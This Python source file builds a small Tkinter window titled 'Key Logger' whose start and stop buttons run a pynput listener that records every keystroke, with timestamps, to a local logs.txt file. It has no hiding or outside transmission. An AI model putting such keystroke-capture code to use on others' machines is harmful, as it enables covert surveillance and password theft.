import tkinter as tk
from tkinter import *
from pynput import keyboard
import datetime


root = tk.Tk()
root.geometry("400x200")
root.resizable(False, False)
root.title("Key Logger")
root.configure(border=20, bg="#a6cc9c", )


key_list = []
x = False
key_strokes = ""

def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

def on_press(key):
    global x, key_list, key_strokes
    key_list.append(
        {'Pressed': f'{key}'}
    )
    x = True
    key_strokes = key_strokes + str(key)
    update_txt_file(key_strokes)


stack = []

def createListener():
    global stack
    listener = keyboard.Listener(on_press=on_press)
    stack.append(listener)
    return listener


def startLog(bool):
    global stack
    if bool == True:
        try:
            temp = createListener()
            temp.start()
            print(
                "{+} Running Keylogger successfully!\n[!] Saving the key logs in 'logs.txt'")
        except:
            print("couldn't start keyboard listener\n")
    elif bool == False:
        temp = stack.pop()
        temp.stop()
        print("\nLogging stopped.\n")


def change_state():
    global key_strokes

    if startBut.cget("state") == NORMAL:
        key_strokes += ("Started logging at: " +
                        str(datetime.datetime.now()) + "\n")
        update_txt_file(key_strokes)

        label1.config(text="Logging started...")
        startBut.config(state=DISABLED)
        endBut.config(state=NORMAL)
    else:
        key_strokes += ("\nFinished logging at: " +
                        str(datetime.datetime.now()) + "\n\n")
        update_txt_file(key_strokes)

        label1.config(text="Logging stopped. Logs saved to logs.txt")
        startBut.config(state=NORMAL)
        endBut.config(state=DISABLED)


empty = Label(root, text="Welcome! to your Key Logger.",
              font='Verdana 16 bold', bg="#a6cc9c")

startBut = tk.Button(root, text="Start logging", command=lambda: [
                     change_state(), startLog(True)])
endBut = tk.Button(root, text="Stop logging", state=DISABLED,
                   command=lambda: [change_state(), startLog(False)])

label1 = Label(root, text="", font='Verdana 10 bold', bg="#a6cc9c")


label1.place(relx=0.5, rely=0.6, anchor=CENTER)
empty.place(relx=0.5, rely=0.1, anchor=CENTER)
startBut.place(relx=0.35, rely=0.8, anchor=CENTER)
endBut.place(relx=0.6, rely=0.8, anchor=CENTER)

root.mainloop()